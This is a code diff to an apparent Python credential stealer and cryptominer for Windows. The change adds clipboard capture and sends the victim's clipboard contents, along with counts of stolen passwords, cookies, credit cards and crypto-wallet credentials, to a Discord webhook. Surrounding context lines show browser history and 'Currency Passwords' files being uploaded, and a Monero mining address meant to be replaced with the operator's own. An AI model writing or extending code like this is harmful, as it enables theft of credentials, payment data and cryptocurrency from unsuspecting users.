@@ -48,6 +48,7 @@ import winreg as reg
 import getpass
 import os
 import zipfile
+import win32clipboard
 from os import walk
 USER_NAME = getpass.getuser()
 
@@ -60,6 +61,7 @@ USER_NAME = getpass.getuser()
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
 WEBHOOK = "webhook667"
+webhook = WEBHOOK
 ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only XMR, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -67,7 +69,8 @@ STATSWEBHOOK = "NoWebhook667EKIP"
 STATSAPI = [
 	"https://api.nanopool.org/v1/xmr/hashrate/" + str(ADDRESS),
 	"https://api.nanopool.org/v1/eth/avghashrate/" + str(ADDRESS),
-	"https://api.nanopool.org/v1/xmr/balance/" + str(ADDRESS)]
+	"https://api.nanopool.org/v1/xmr/balance/" + str(ADDRESS)
+]
 
 
 
@@ -143,6 +146,10 @@ yes = "yes"
 
 if yes == "yes":
 
+	def GetClipboardData():
+		win32clipboard.OpenClipboard()
+		data = win32clipboard.GetClipboardData()
+		return data
 	def ClearTerm():
 		if(os.name == "nt" or os.name == "windows"):
 			os.system("cls")
@@ -740,6 +747,7 @@ if yes == "yes":
 		values = extract(obj, arr, key)
 		return values
 
+
 	def minerstats():
 		if(STATSWEBHOOK != "NoWebhook"):
 			hashrate = ""
@@ -806,7 +814,7 @@ if yes == "yes":
 		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="History.txt")
 		webhook.add_file(file=currency, filename="Currency Passwords.txt")
 		webhook.add_file(file=currencyCookies, filename="Currency Cookies.txt")
-		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_with_wings: Currency Password : {CURRENCYPWNUM}**', color='03b2f8')
+		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_with_wings: Currency Password : {CURRENCYPWNUM}\n:clipboard: Clipboard : ```{GetClipboardData()}```**', color='03b2f8')
 		webhook.add_embed(embed2)
 		webhook.execute()
 		connectOption()
